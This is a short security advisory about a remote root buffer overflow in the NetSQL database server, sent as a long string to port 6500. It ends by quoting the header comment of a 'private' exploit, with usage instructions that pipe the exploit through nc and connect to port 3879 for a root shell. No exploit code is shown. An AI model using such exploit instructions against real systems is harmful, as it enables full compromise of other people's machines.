NetSQL is an implementation of a database and toolset distributed by Munica Corporation. NetSQL is part of 5 piece software package called the Webpak, containing utilities for features such as web boards, membership, and online calendars.

A buffer overflow in the server makes it possible for a remote user to gain remote root access to a system using the affected software. By sending a long string to port 6500, a remote user can create a buffer overflow, allowing code execution.

This makes it possible for a remote user to gain remote root access, resulting in complete compromise of a system using the affected software.

/* PRIVATE EXPLOIT, DONT DISTRO%$##$%$#
 * Remote exploit for NetSQL server, by Sergio Monteiro a.k.a Papa-tudo
 * netsqld - An SQL database server with Web interface
 * check http://www.sekurity.com.br .
 *
 * There is an easily exploitable buffer overflow in netsql.
 * This exploit was tested on redhat 6.2.
 *
 * Run like: ./netsql | nc host.com 6500
 * Then connect to port 3879 for the rootshell.
